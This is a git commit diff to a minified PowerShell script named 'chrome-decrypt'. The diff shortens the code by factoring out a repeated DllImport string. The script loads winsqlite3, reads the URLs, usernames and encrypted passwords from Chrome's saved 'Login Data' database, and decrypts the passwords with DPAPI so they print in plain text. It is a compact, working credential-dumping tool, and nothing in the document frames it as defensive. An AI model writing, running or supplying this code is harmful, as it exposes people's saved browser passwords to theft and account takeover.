f2b59f50c0323a6ac367529e6123941807fa5ac6
Robert Wallhead <rwallhead@gmail.com>
2018-09-29 12:07:01 +1000

    1142

--- chrome-decrypt.minified.ps1
+++ chrome-decrypt.minified.ps1
@@ -1,7 +1,8 @@
 $d=Add-Type -A S*m.Security
 $g='public static extern '
+$i=';[DllImport(d'
 $m='[MarshalAs(UnmanagedType.LP'
-Add-Type('using System.Runtime.InteropServices;using p=System.IntPtr;public class W{const string d="winsqlite3";[DllImport(d)]'+$g+'p sqlite3_open('+$m+'Str)]string f,out p d);[DllImport(d,EntryPoint="sqlite3_prepare16_v2")]'+$g+'p P(p d,'+$m+'WStr)]string l,int n,out p s,p t);[DllImport(d)]'+$g+'p sqlite3_step(p s);[DllImport(d,EntryPoint="sqlite3_column_text16")]'+$g+'p C(p s,int i);[DllImport(d,EntryPoint="sqlite3_column_bytes")]'+$g+'int Y(p s,int i);[DllImport(d,EntryPoint="sqlite3_column_blob")]'+$g+'p L(p s,int i);public static string T(p s,int i){return Marshal.PtrToStringUni(C(s,i));}public static byte[] B(p s,int i){int l=Y(s,i);var r=new byte[l];Marshal.Copy(L(s,i),r,0,l);return r;}}')
+Add-Type('using System.Runtime.InteropServices;using p=System.IntPtr;public class W{const string d="winsqlite3"'+$i+')]'+$g+'p sqlite3_open('+$m+'Str)]string f,out p d)'+$i+',EntryPoint="sqlite3_prepare16_v2")]'+$g+'p P(p d,'+$m+'WStr)]string l,int n,out p s,p t)'+$i+')]'+$g+'p sqlite3_step(p s)'+$i+',EntryPoint="sqlite3_column_text16")]'+$g+'p C(p s,int i)'+$i+',EntryPoint="sqlite3_column_bytes")]'+$g+'int Y(p s,int i)'+$i+',EntryPoint="sqlite3_column_blob")]'+$g+'p L(p s,int i);public static string T(p s,int i){return Marshal.PtrToStringUni(C(s,i));}public static byte[] B(p s,int i){int l=Y(s,i);var r=new byte[l];Marshal.Copy(L(s,i),r,0,l);return r;}}')
 $s=[W]::sqlite3_open($env:LOCALAPPDATA+'\Google\Chrome\User Data\Default\Login Data',[ref]$d)
 $_=[W]::P($d,"SELECT action_url,username_value,password_value FROM logins",-1,[ref]$s,0)
 for(;!([W]::sqlite3_step($s)%100)){[W]::T($s,0)+","+[W]::T($s,1)+","+[System.Text.Encoding]::ASCII.GetString([System.Security.Cryptography.ProtectedData]::Unprotect([W]::B($s,2),$null,1))}
